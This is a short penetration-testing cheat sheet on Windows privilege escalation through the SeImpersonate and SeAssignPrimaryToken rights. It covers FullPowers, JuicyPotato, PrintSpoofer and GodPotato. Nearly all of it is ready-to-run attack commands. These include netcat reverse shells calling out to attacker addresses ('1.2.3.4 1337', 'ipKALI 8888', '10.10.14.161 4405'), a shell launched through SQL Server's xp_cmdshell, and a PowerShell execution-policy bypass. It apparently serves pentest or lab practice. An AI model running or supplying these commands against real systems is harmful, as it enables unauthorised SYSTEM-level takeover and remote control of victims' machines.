# SeImpersonate

```powershell
whoami /priv
# give you a listing of all user rights you have to see :
  SeImpersonate
```

## SeImpersonate and SeAssignPrimaryToken
### FullPowers
```
FullPowers is a Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
FullPowers -c "powershell -ep Bypass"

FullPowers
OR
FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
```
### JuicyPotato
don't work on Windows 10 and Server 2019
https://github.com/ohpe/juicy-potato/releases
```sql
# from sql connection
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe ipKALI 8888 -e cmd.exe" -t *
# xp_cmdshell is used to run system commande such as whoami enable it first : enable_xp_cmdshell it comes from impacket MSSQL
# On kali :
nc -nvlp 8888
```
PrintSpoofer or Roguepotato Work on Windows 10 Server 2019
https://github.com/dievus/printspoofer
```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe IPkali 8888 -e cmd"
# kali :
nc -nvlp 8888
```

### GodPotato
```
expand privileges
check priv
GodPotato-NET4.exe -cmd "cmd /c whoami"
nc -nvlp 4405
GodPotato-NET4.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.161 4405
```



